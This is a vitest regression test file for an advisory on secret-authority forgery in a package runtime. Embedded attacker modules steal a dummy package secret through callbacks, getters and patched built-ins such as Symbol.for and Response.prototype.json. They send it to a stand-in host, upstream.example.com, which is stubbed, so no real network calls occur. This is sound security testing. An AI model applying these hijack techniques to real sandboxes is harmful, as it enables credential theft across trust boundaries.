import {
	personIdFromStored,
	ownerIdFromStored,
} from '@kody-internal/shared/owner-person-ids.ts'
import { env } from 'cloudflare:workers'
import { afterEach, expect, test, vi } from 'vitest'
import { createMcpCallerContext } from '#mcp/context.ts'
import { runBundledModuleWithRegistry } from '#mcp/run-kody-registry.ts'
import { saveSecret, setSecretAllowedHosts } from '#mcp/secrets/service.ts'
import { ensureEntitlementTestSchema } from '#worker/entitlements/test-schema.ts'
import { ensureOrgsTestSchema } from '#worker/orgs/orgs-test-schema.ts'
import { ensurePersonalOrg } from '#worker/orgs/provision.ts'
import { silenceIncidentalRuntimeWarnings } from '#worker/test-support/incidental-runtime-warnings.ts'
import {
	buildKodyImportableModuleBundle,
	buildKodyModuleBundle,
} from './module-graph.ts'
import { persistPublishedBundleArtifact } from './published-bundle-artifacts.ts'
import { persistPublishedSourceSnapshot } from './published-runtime-artifacts.ts'
import { ensureSecretBucketsTestSchema } from '#worker/secrets-test-schema.ts'
import { ensureSoftDeleteTestColumns } from '#worker/soft-delete/test-schema.ts'

async function runSql(sql: string, ...values: Array<unknown>) {
	await env.APP_DB.prepare(sql)
		.bind(...values)
		.run()
}

async function ensureSecretAuthorityTestSchema() {
	await ensureEntitlementTestSchema(env.APP_DB)
	await ensureOrgsTestSchema(env.APP_DB)
	await runSql(`CREATE TABLE IF NOT EXISTS entity_sources (
		id TEXT PRIMARY KEY,
		user_id TEXT NOT NULL,
		entity_kind TEXT NOT NULL,
		entity_id TEXT NOT NULL,
		repo_id TEXT NOT NULL,
		published_commit TEXT,
		indexed_commit TEXT,
		manifest_path TEXT NOT NULL DEFAULT 'package.json',
		source_root TEXT NOT NULL DEFAULT '/',
		created_at TEXT NOT NULL,
		updated_at TEXT NOT NULL
	)`)
	await runSql(`CREATE TABLE IF NOT EXISTS saved_packages (
		id TEXT PRIMARY KEY NOT NULL,
		user_id TEXT NOT NULL,
		name TEXT NOT NULL,
		kody_id TEXT NOT NULL,
		description TEXT NOT NULL,
		tags_json TEXT NOT NULL DEFAULT '[]',
		search_text TEXT,
		source_id TEXT NOT NULL,
		has_app INTEGER NOT NULL DEFAULT 0 CHECK (has_app IN (0, 1)),
		has_skills INTEGER NOT NULL DEFAULT 0 CHECK (has_skills IN (0, 1)),
		hidden INTEGER NOT NULL DEFAULT 0 CHECK (hidden IN (0, 1)),
		is_private INTEGER NOT NULL DEFAULT 1 CHECK (is_private IN (0, 1)),
		is_internet_visible INTEGER NOT NULL DEFAULT 0,
		locked_at TEXT,
		created_at TEXT NOT NULL DEFAULT (CURRENT_TIMESTAMP),
		updated_at TEXT NOT NULL DEFAULT (CURRENT_TIMESTAMP)
	)`)
	try {
		await runSql(
			`ALTER TABLE saved_packages ADD COLUMN is_internet_visible INTEGER NOT NULL DEFAULT 0`,
		)
	} catch {
		// Column already present on newer schemas.
	}
	await runSql(`CREATE TABLE IF NOT EXISTS published_bundle_artifacts (
		id TEXT PRIMARY KEY,
		user_id TEXT NOT NULL,
		source_id TEXT NOT NULL,
		published_commit TEXT NOT NULL,
		artifact_kind TEXT NOT NULL,
		artifact_name TEXT,
		entry_point TEXT NOT NULL,
		kv_key TEXT NOT NULL,
		dependencies_json TEXT NOT NULL DEFAULT '[]',
		created_at TEXT NOT NULL,
		updated_at TEXT NOT NULL
	)`)
	// Shared helper mirrors migrations (including secret_entries.kind); do not
	// hand-copy the table DDL here (#3523).
	await ensureSecretBucketsTestSchema(env.APP_DB)
	await runSql(`CREATE TABLE IF NOT EXISTS community_forks (
		id TEXT PRIMARY KEY NOT NULL,
		listing_id TEXT, upstream_owner_id TEXT, upstream_package_id TEXT,
		forker_user_id TEXT NOT NULL,
		origin_commit TEXT NOT NULL,
		forked_package_id TEXT NOT NULL,
		forked_source_id TEXT NOT NULL,
		target_kody_id TEXT NOT NULL,
		listing_name TEXT,
		listing_kody_id TEXT,
		adopted_at TEXT,
		adoption_note TEXT,
		actor TEXT,
		created_at TEXT NOT NULL DEFAULT (CURRENT_TIMESTAMP)
	)`)
	await ensureSoftDeleteTestColumns(env.APP_DB)
}

async function insertSavedPackage(input: {
	userId: string
	packageId: string
	kodyId: string
	name: string
	sourceId: string
	publishedCommit: string
}) {
	const now = new Date().toISOString()
	await runSql(
		`INSERT INTO saved_packages (
			id, user_id, name, kody_id, description, tags_json, search_text,
			source_id, has_app, created_at, updated_at
		) VALUES (?, ?, ?, ?, ?, '[]', NULL, ?, 0, ?, ?)`,
		input.packageId,
		input.userId,
		input.name,
		input.kodyId,
		`${input.name} package`,
		input.sourceId,
		now,
		now,
	)
	await runSql(
		`INSERT INTO entity_sources (
			id, user_id, entity_kind, entity_id, repo_id, published_commit,
			indexed_commit, manifest_path, source_root, created_at, updated_at
		) VALUES (?, ?, 'package', ?, ?, ?, NULL, 'package.json', '/', ?, ?)`,
		input.sourceId,
		input.userId,
		input.packageId,
		`repo-${input.sourceId}`,
		input.publishedCommit,
		now,
		now,
	)
	return {
		id: input.sourceId,
		user_id: ownerIdFromStored(input.userId),
		entity_kind: 'package' as const,
		entity_id: input.packageId,
		repo_id: `repo-${input.sourceId}`,
		published_commit: input.publishedCommit,
		indexed_commit: null,
		manifest_path: 'package.json',
		source_root: '/',
		last_external_check_at: null,
		external_check_until: null,
		created_at: now,
		updated_at: now,
	}
}

type PublishedPackage = { packageId: string; sourceId: string; kodyId: string }

/** Publishes importable-module artifacts and records the package as an unadopted community fork. */
async function publishForkedPackage(input: {
	userId: string
	name: string
	kodyId: string
	sourceFiles: Record<string, string>
	exports: Array<{ artifactName: string; entryPoint: string }>
}): Promise<PublishedPackage> {
	const unique = crypto.randomUUID()
	const packageId = `pkg-${unique}`
	const sourceId = `source-${unique}`
	const source = await insertSavedPackage({
		userId: input.userId,
		packageId,
		kodyId: input.kodyId,
		name: input.name,
		sourceId,
		publishedCommit: `commit-${unique}`,
	})
	await persistPublishedSourceSnapshot({
		env,
		userId: input.userId,
		source,
		snapshot: { files: input.sourceFiles },
	})
	for (const target of input.exports) {
		const artifactBundle = await buildKodyImportableModuleBundle({
			env,
			baseUrl: 'https://kody.dev',
			userId: input.userId,
			sourceFiles: input.sourceFiles,
			entryPoint: target.entryPoint,
			rootPackageId: packageId,
		})
		await persistPublishedBundleArtifact({
			env,
			userId: input.userId,
			source,
			kind: 'importable-module',
			artifactName: target.artifactName,
			entryPoint: target.entryPoint,
			mainModule: artifactBundle.mainModule,
			modules: artifactBundle.modules,
			dependencies: artifactBundle.dependencies,
			packageContext: { packageId, kodyId: input.kodyId, sourceId },
		})
	}
	await runSql(
		`INSERT INTO community_forks (
			id, listing_id, forker_user_id, origin_commit, forked_package_id,
			forked_source_id, target_kody_id, created_at
		) VALUES (?, ?, ?, 'origin', ?, ?, ?, ?)`,
		`fork-${packageId}`,
		`listing-${packageId}`,
		input.userId,
		packageId,
		sourceId,
		input.kodyId,
		new Date().toISOString(),
	)
	return { packageId, sourceId, kodyId: input.kodyId }
}

const wakeMount = (scope: 'user' | 'package' = 'user') => ({
	wakeToken: { name: 'wakeToken', scope },
})

function manifest(name: string, kody: Record<string, unknown>, extra = {}) {
	return JSON.stringify({ name, ...extra, kody })
}

async function publishGrokBotWake(
	userId: string,
	wakeSource: string,
	scope: 'user' | 'package' = 'user',
) {
	return await publishForkedPackage({
		userId,
		name: '@kentcdodds/grok-bot',
		kodyId: 'grok-bot',
		sourceFiles: {
			'package.json': manifest(
				'@kentcdodds/grok-bot',
				{
					id: 'grok-bot',
					description: 'Wake helper',
					secretMounts: wakeMount(scope),
				},
				{ exports: { './wake': './src/wake.ts' } },
			),
			'src/wake.ts': wakeSource,
		},
		exports: [{ artifactName: './wake', entryPoint: 'src/wake.ts' }],
	})
}

async function publishDependent(
	userId: string,
	files: Record<string, string>,
	kody: Record<string, unknown> = {},
) {
	const exportEntries = Object.keys(files)
		.filter((path) => path.startsWith('src/'))
		.map((path) => [`./${path.slice(4, -3)}`, path] as const)
	return await publishForkedPackage({
		userId,
		name: '@kentcdodds/dependent',
		kodyId: 'dependent',
		sourceFiles: {
			'package.json': manifest(
				'@kentcdodds/dependent',
				{
					id: 'dependent',
					description: 'Dependent',
					dependencies: { '@kentcdodds/grok-bot': '*' },
					...kody,
				},
				{
					exports: Object.fromEntries(
						exportEntries.map(([name, path]) => [name, `./${path}`]),
					),
				},
			),
			...files,
		},
		exports: exportEntries.map(([artifactName, entryPoint]) => ({
			artifactName,
			entryPoint,
		})),
	})
}

async function provisionTestUser(userId: string, username: string) {
	await ensurePersonalOrg(env.APP_DB, { stableUserId: userId, username })
}

function createCallerContext(userId: string) {
	return createMcpCallerContext({
		source: { kind: 'mcp-oauth' },
		baseUrl: 'https://kody.dev',
		user: {
			userId: personIdFromStored(userId),
			username: 'worker-test',
			email: 'worker@example.com',
			displayName: 'Worker Test',
		},
	})
}

async function buildModule(
	userId: string,
	sourceFiles: Record<string, string>,
	entryPoint = 'entry.ts',
	rootPackageId?: string,
) {
	return await buildKodyModuleBundle({
		env,
		baseUrl: 'https://kody.dev',
		userId,
		sourceFiles,
		entryPoint,
		...(rootPackageId ? { rootPackageId } : {}),
	})
}

/** Runs as execute when `asPackage` is omitted; otherwise enters as that package's root. */
async function runModule(
	userId: string,
	sourceFiles: Record<string, string>,
	options: { entryPoint?: string; asPackage?: PublishedPackage } = {},
) {
	const { asPackage } = options
	return await runBundledModuleWithRegistry(
		env,
		createCallerContext(userId),
		await buildModule(
			userId,
			sourceFiles,
			options.entryPoint,
			asPackage?.packageId,
		),
		undefined,
		{
			skipCapabilityRegistry: true,
			...(asPackage
				? {
						packageContext: {
							packageId: asPackage.packageId,
							kodyId: asPackage.kodyId,
							sourceId: asPackage.sourceId,
						},
					}
				: {}),
		},
	)
}

// ---------------------------------------------------------------------------
// GHSA-5fv3-qv7j-rqf5 regression (local only; dummy secret; fake upstream).
// A = @kentcdodds/grok-bot (credential package, package-scoped dummy secret,
//     approved host upstream.example.com). A's own policy: POST /a-only/wake.
// B = importer (execute entry, or a published dependent package). B passes
//     A an options object with a getter + sync callback + async callback.
// The fake upstream is a stubbed global fetch in the host isolate; no network.
// ---------------------------------------------------------------------------

function secretAuthorityForgeryExecuteEntry(attackSpecifier: string) {
	return `import attack from '${attackSpecifier}'
import wake from 'kody:@kentcdodds/grok-bot/wake'
export default async function main() {
	return { importedWake: typeof wake, attack: await attack() }
}`
}

const DUMMY_SECRET = 'dummy-A-only-secret-0000'
const NEW_TOKEN = 'dummy-newly-issued-access-token-1111'
type Seen = {
	method: string
	url: string
	authorization: string | null
	body: string
}

function installFakeUpstream() {
	const seen: Array<Seen> = []
	const realFetch = globalThis.fetch
	vi.stubGlobal(
		'fetch',
		async (input: RequestInfo | URL, init?: RequestInit) => {
			const request = new Request(input as RequestInfo, init)
			const url = new URL(request.url)
			if (url.hostname !== 'upstream.example.com')
				return realFetch(input as RequestInfo, init)
			const body = await request.text()
			seen.push({
				method: request.method,
				url: request.url,
				authorization: request.headers.get('authorization'),
				body,
			})
			if (url.pathname === '/oauth/token') {
				// Refresh-token exchange: echoes the presented refresh secret and
				// mints a brand-new access token the gateway has never seen.
				return Response.json({
					access_token: NEW_TOKEN,
					refresh_token_echo: new URLSearchParams(body).get('refresh_token'),
				})
			}
			return Response.json({
				ok: true,
				path: url.pathname,
				sawAuth: request.headers.get('authorization'),
			})
		},
	)
	return seen
}

afterEach(() => {
	vi.unstubAllGlobals()
})

const victimWithHooksSource = `import { packageSecrets } from 'kody:runtime'
export default async function wake(options) {
	// A reads a caller field (getter fires) and calls caller callbacks, as
	// ordinary libraries do (onProgress / transform / logger hooks).
	const label = String(options?.label ?? 'wake')
	if (typeof options?.onProgress === 'function') options.onProgress('start')
	const token = await packageSecrets.get('wakeToken')
	const res = await fetch('https://upstream.example.com/a-only/wake', {
		method: 'POST',
		headers: { Authorization: 'Bearer ' + token },
		body: label,
	})
	const legit = await res.json()
	if (typeof options?.afterAwait === 'function') await options.afterAwait()
	return { legit }
}`

const attackerHelpers = `
const REF = '{{secret:wakeToken|scope=package}}'
const out = { getter: null, sync: null, asyncCb: null, secretGet: null }
function attempt(key, fn) {
	try {
		const p = fn()
		out[key] = p && typeof p.then === 'function'
			? p.then((v) => (out[key] = { value: v }), (e) => (out[key] = { error: String(e?.message ?? e) }))
			: { value: p }
		return out[key]
	} catch (e) {
		out[key] = { error: String(e?.message ?? e) }
	}
}
async function off(path, init) {
	const r = await fetch('https://upstream.example.com' + path, init)
	return { status: r.status, text: await r.text() }
}
`

const attackerMain = `
export default async function main() {
	// Baseline: B's own code, outside A's call — must be refused.
	let direct
	try { direct = await off('/direct/outside-a', { method: 'DELETE', headers: { Authorization: 'Bearer ' + REF } }) }
	catch (e) { direct = { error: String(e?.message ?? e) } }
	let directSecretGet
	try { directSecretGet = await kody.packageSecretGet({ alias: 'wakeToken' }) }
	catch (e) { directSecretGet = { error: String(e?.message ?? e) } }
	const pending = []
	const options = {
		get label() {
			// (1) getter: fires synchronously inside A's stamp
			pending.push(attempt('getter', () => off('/admin/delete-all', { method: 'DELETE', headers: { Authorization: 'Bearer ' + REF } })))
			return 'x'
		},
		onProgress() {
			// (2) sync callback: credential fetch + kody.packageSecretGet
			pending.push(attempt('sync', () => off('/repos/private/contents', { method: 'PUT', headers: { Authorization: 'Bearer ' + REF } })))
			pending.push(attempt('secretGet', () => kody.packageSecretGet({ alias: 'wakeToken' })))
		},
		async afterAwait() {
			// (3) async callback after A awaited (native async branch)
			await new Promise((r) => setTimeout(r, 1))
			pending.push(attempt('asyncCb', () => off('/oauth/token', {
				method: 'POST',
				headers: { 'content-type': 'application/x-www-form-urlencoded' },
				body: 'grant_type=refresh_token&refresh_token=' + REF,
			})))
		},
	}
	const legit = await wake(options)
	await Promise.all(pending.map((p) => Promise.resolve(p).catch(() => {})))
	// Authority restored after return?
	let afterReturn
	try { afterReturn = await kody.packageSecretGet({ alias: 'wakeToken' }) }
	catch (e) { afterReturn = { error: String(e?.message ?? e) } }
	return { direct, directSecretGet, legit, ...out, afterReturn }
}`

async function setupVictim() {
	silenceIncidentalRuntimeWarnings()
	await ensureSecretAuthorityTestSchema()
	const userId = `user-${crypto.randomUUID()}`
	await provisionTestUser(userId, `wt-${userId.slice(-12)}`)
	const wake = await publishGrokBotWake(
		userId,
		victimWithHooksSource,
		'package',
	)
	const storageContext = {
		sessionId: null,
		appId: null,
		packageId: wake.packageId,
		storageId: wake.packageId,
	}
	await saveSecret({
		env,
		userId: ownerIdFromStored(userId),
		scope: 'package',
		name: 'wakeToken',
		value: DUMMY_SECRET,
		storageContext,
		audit: null,
	})
	await setSecretAllowedHosts({
		env,
		userId: ownerIdFromStored(userId),
		scope: 'package',
		name: 'wakeToken',
		allowedHosts: ['upstream.example.com'],
		storageContext,
		audit: null,
	})
	return { userId, wake }
}

function report(label: string, seen: Array<Seen>, result: unknown) {
	console.log(
		`\n===== ${label} =====\nupstream saw:\n` +
			JSON.stringify(seen, null, 2) +
			`\nsandbox result:\n` +
			JSON.stringify(result, null, 2),
	)
}

test(
	'GHSA-5fv3: execute-entry importer callbacks/getters run with A authority (B = agent-written execute code)',
	{ timeout: 90_000 },
	async () => {
		const { userId } = await setupVictim()
		const seen = installFakeUpstream()
		const run = await runModule(userId, {
			'entry.ts': `import wake from 'kody:@kentcdodds/grok-bot/wake'
import { kody } from 'kody:runtime'
${attackerHelpers}
${attackerMain}`,
		})
		report('execute-entry importer', seen, run.result ?? run.error)
		expect(run.error).toBeUndefined()
		const r = run.result as Record<string, unknown>
		// Control: A's own legitimate fetch carries the secret.
		const legitHit = seen.find((s) => s.url.endsWith('/a-only/wake'))
		expect(legitHit?.authorization).toBe(`Bearer ${DUMMY_SECRET}`)
		// Negative control: B's direct fetch outside A must not get the secret.
		const directHits = seen.filter(
			(s) =>
				s.url.endsWith('/direct/outside-a') &&
				s.authorization === `Bearer ${DUMMY_SECRET}`,
		)
		// Observations recorded (the assertions below describe the SECURE expectation)
		const leaked = seen.filter(
			(s) =>
				!s.url.endsWith('/a-only/wake') &&
				!s.url.endsWith('/direct/outside-a') &&
				(s.authorization?.includes(DUMMY_SECRET) ||
					s.body.includes(DUMMY_SECRET)),
		)
		console.log(
			'\nLEAKED-TO-NON-A-PATHS:',
			JSON.stringify(
				leaked.map((s) => `${s.method} ${new URL(s.url).pathname}`),
			),
		)
		console.log('directHits (B outside A):', directHits.length)
		console.log(
			'secretGet in callback:',
			JSON.stringify(r.secretGet),
			' directSecretGet:',
			JSON.stringify(r.directSecretGet),
			' afterReturn:',
			JSON.stringify(r.afterReturn),
		)
		console.log('token exchange body returned to B:', JSON.stringify(r.asyncCb))
		expect(JSON.stringify(r)).not.toContain(DUMMY_SECRET)
		// SECURE expectation (fails while the bug exists):
		expect
			.soft(leaked, 'importer-authored hooks must not receive A secret')
			.toEqual([])
		expect.soft(JSON.stringify(r.asyncCb ?? '')).not.toContain(NEW_TOKEN)
		expect(directHits).toEqual([])
	},
)

test(
	'GHSA-5fv3: published dependent package B importing A (B has no A grant)',
	{ timeout: 90_000 },
	async () => {
		const { userId, wake } = await setupVictim()
		const importer = await publishDependent(userId, {
			'src/attack.ts': `import wake from 'kody:@kentcdodds/grok-bot/wake'
import { kody } from 'kody:runtime'
${attackerHelpers}
${attackerMain}`,
		})
		const seen = installFakeUpstream()
		const run = await runModule(
			userId,
			{
				'package.json': manifest(
					'@kentcdodds/dependent',
					{
						id: 'dependent',
						description: 'Dependent',
						dependencies: { '@kentcdodds/grok-bot': '*' },
					},
					{ exports: { './attack': './src/attack.ts' } },
				),
				'src/attack.ts': `import wake from 'kody:@kentcdodds/grok-bot/wake'
import { kody } from 'kody:runtime'
${attackerHelpers}
${attackerMain}`,
			},
			{ entryPoint: 'src/attack.ts', asPackage: importer },
		)
		report(
			`package B (${importer.packageId}) importing A (${wake.packageId})`,
			seen,
			run.result ?? run.error,
		)
		expect(run.error).toBeUndefined()
		const leaked = seen.filter(
			(s) =>
				!s.url.endsWith('/a-only/wake') &&
				!s.url.endsWith('/direct/outside-a') &&
				(s.authorization?.includes(DUMMY_SECRET) ||
					s.body.includes(DUMMY_SECRET)),
		)
		console.log(
			'\nLEAKED-TO-NON-A-PATHS:',
			JSON.stringify(
				leaked.map((s) => `${s.method} ${new URL(s.url).pathname}`),
			),
		)
		expect(
			seen.find((s) => s.url.endsWith('/a-only/wake'))?.authorization,
		).toBe(`Bearer ${DUMMY_SECRET}`)
		expect
			.soft(leaked, 'importer-authored hooks must not receive A secret')
			.toEqual([])
	},
)

test(
	'GHSA-5fv3: unadopted fork B escalates to self-authored A implicit user-secret read via callback',
	{ timeout: 90_000 },
	async () => {
		silenceIncidentalRuntimeWarnings()
		await ensureSecretAuthorityTestSchema()
		const userId = `user-${crypto.randomUUID()}`
		await provisionTestUser(userId, `wt-${userId.slice(-12)}`)
		// A: self-authored (drop the community_forks row) -> implicit read of user secrets.
		const wake = await publishGrokBotWake(
			userId,
			`export default async function wake(cb) { if (typeof cb === 'function') cb(); return { ok: true } }`,
		)
		await runSql(
			`DELETE FROM community_forks WHERE forked_package_id = ?`,
			wake.packageId,
		)
		// B: unadopted community fork (no implicit user-secret read), published + stamped.
		await publishDependent(userId, {
			'src/attack.ts': `import wake from 'kody:@kentcdodds/grok-bot/wake'
const REF = '{{secret:unrelatedUserToken|scope=user}}'
async function off(path) {
	try {
		const r = await fetch('https://upstream.example.com' + path, { headers: { Authorization: 'Bearer ' + REF } })
		return { status: r.status }
	} catch (e) { return { error: String(e?.message ?? e).slice(0, 200) } }
}
export default async function attack() {
	const direct = await off('/direct/outside-a')
	let inside
	await wake(() => { inside = off('/inside/callback') })
	return { direct, inside: await inside }
}`,
		})
		await saveSecret({
			env,
			userId: ownerIdFromStored(userId),
			scope: 'user',
			name: 'unrelatedUserToken',
			value: DUMMY_SECRET,
			audit: null,
		})
		await setSecretAllowedHosts({
			env,
			userId: ownerIdFromStored(userId),
			scope: 'user',
			name: 'unrelatedUserToken',
			allowedHosts: ['upstream.example.com'],
			audit: null,
		})
		const seen = installFakeUpstream()
		// Entry is the victim's own execute: imports B (and A directly, so A is in the grant set).
		const run = await runModule(userId, {
			'entry.ts': secretAuthorityForgeryExecuteEntry(
				'kody:@kentcdodds/dependent/attack',
			),
		})
		report(
			'unadopted fork B (stamped) -> self-authored A (user secret not locked to anything)',
			seen,
			run.result ?? run.error,
		)
		const leaked = seen
			.filter((s) => s.authorization?.includes(DUMMY_SECRET))
			.map((s) => new URL(s.url).pathname)
		console.log(
			'\nPATHS-THAT-RECEIVED-DUMMY-USER-SECRET:',
			JSON.stringify(leaked),
		)
		// Hybrid nested rule: unadopted B has no implicit access; ad-hoc execute
		// can use the secret but clause (2) still requires authority implicit.
		expect(leaked, 'unadopted fork must not gain user secrets').toEqual([])
	},
)

test(
	'GHSA-5fv3: no-argument export still reentered via a shared intrinsic B patched (Response.prototype.json)',
	{ timeout: 90_000 },
	async () => {
		const { userId } = await setupVictim()
		const seen = installFakeUpstream()
		const run = await runModule(userId, {
			'entry.ts': `import wake from 'kody:@kentcdodds/grok-bot/wake'
export default async function main() {
	const REF = '{{secret:wakeToken|scope=package}}'
	const realJson = Response.prototype.json
	let hijack
	Response.prototype.json = function () {
		if (!hijack) hijack = fetch('https://upstream.example.com/via/patched-intrinsic', { method: 'DELETE', headers: { Authorization: 'Bearer ' + REF } }).then((r) => r.status, (e) => String(e?.message ?? e).slice(0, 160))
		return realJson.call(this)
	}
	const legit = await wake() // A is called with NO caller-supplied arguments
	Response.prototype.json = realJson
	return { legit, hijack: await hijack }
}`,
		})
		report(
			'primitive/no-arg call, shared intrinsic patched by B',
			seen,
			run.result ?? run.error,
		)
		const leaked = seen
			.filter(
				(s) =>
					!s.url.endsWith('/a-only/wake') &&
					s.authorization?.includes(DUMMY_SECRET),
			)
			.map((s) => `${s.method} ${new URL(s.url).pathname}`)
		console.log('\nLEAKED-VIA-INTRINSIC:', JSON.stringify(leaked))
		expect.soft(leaked).toEqual([])
	},
)

test(
	'GHSA-5fv3: Symbol.for forge — B patches Symbol.for so the executor reads B-planted authority getter',
	{ timeout: 90_000 },
	async () => {
		const { userId, wake } = await setupVictim()
		const seen = installFakeUpstream()
		const run = await runModule(userId, {
			'entry.ts': `import wake from 'kody:@kentcdodds/grok-bot/wake'
import { kody } from 'kody:runtime'
export default async function main() {
	const REF = '{{secret:wakeToken|scope=package}}'
	const realFor = Symbol.for
	const evil = Symbol('evil-authority')
	Object.defineProperty(globalThis, evil, { value: () => ${JSON.stringify(wake.packageId)} })
	Symbol.for = function (key) { return key === 'kody.getSecretAuthority' ? evil : realFor.call(Symbol, key) }
	let forgedFetch, forgedGet
	try {
		const r = await fetch('https://upstream.example.com/via/symbol-for-forge', { method: 'DELETE', headers: { Authorization: 'Bearer ' + REF } })
		forgedFetch = r.status
	} catch (e) { forgedFetch = String(e?.message ?? e).slice(0, 160) }
	try { forgedGet = await kody.packageSecretGet({ alias: 'wakeToken' }) } catch (e) { forgedGet = { error: String(e?.message ?? e).slice(0, 160) } }
	Symbol.for = realFor
	return { importedWake: typeof wake, forgedFetch, forgedGet }
}`,
		})
		report('Symbol.for forge', seen, run.result ?? run.error)
		const leaked = seen
			.filter((s) => s.authorization?.includes(DUMMY_SECRET))
			.map((s) => `${s.method} ${new URL(s.url).pathname}`)
		console.log('\nLEAKED-VIA-SYMBOL-FOR:', JSON.stringify(leaked))
		expect(JSON.stringify(run.result ?? '')).not.toContain(DUMMY_SECRET)
		expect.soft(leaked).toEqual([])
	},
)

test(
	'GHSA-5fv3: intrinsics B patches to re-enter during A own secret call (trim / Reflect.apply / store.kody)',
	{ timeout: 90_000 },
	async () => {
		const { userId } = await setupVictim()
		const seen = installFakeUpstream()
		const run = await runModule(userId, {
			'entry.ts': `import wake from 'kody:@kentcdodds/grok-bot/wake'
import { kody } from 'kody:runtime'
export default async function main() {
	const REF = '{{secret:wakeToken|scope=package}}'
	const hits = []
	const fire = (tag) => { hits.push(fetch('https://upstream.example.com/via/' + tag, { method: 'DELETE', headers: { Authorization: 'Bearer ' + REF } }).then((r) => tag + ':' + r.status, (e) => tag + ':' + String(e?.message ?? e).slice(0, 80))) }
	const realTrim = String.prototype.trim
	const realApply = Reflect.apply
	let inTrim = false, inApply = false
	String.prototype.trim = function () { if (!inTrim) { inTrim = true; fire('trim') } return realTrim.call(this) }
	Reflect.apply = function (t, th, a) { if (!inApply) { inApply = true; fire('reflect-apply') } return realApply(t, th, a) }
	let storeMutation = 'ok'
	try {
		const store = globalThis[Symbol.for('kody.runtimeStorage')].getStore()
		const realKody = store.kody
		store.kody = new Proxy({}, { get: (_, p) => (...args) => { fire('store-kody-' + String(p)); return realKody[p](...args) } })
	} catch (e) { storeMutation = String(e?.message ?? e).slice(0, 80) }
	let legit
	try { legit = await wake() } catch (e) { legit = { error: String(e?.message ?? e).slice(0, 200) } }
	String.prototype.trim = realTrim
	Reflect.apply = realApply
	return { legit, storeMutation, hits: await Promise.all(hits) }
}`,
		})
		report('re-entry via patched intrinsics', seen, run.result ?? run.error)
		const leaked = seen
			.filter(
				(s) =>
					!s.url.endsWith('/a-only/wake') &&
					s.authorization?.includes(DUMMY_SECRET),
			)
			.map((s) => `${s.method} ${new URL(s.url).pathname}`)
		console.log('\nLEAKED-VIA-REENTRY:', JSON.stringify(leaked))
		expect.soft(leaked).toEqual([])
	},
)
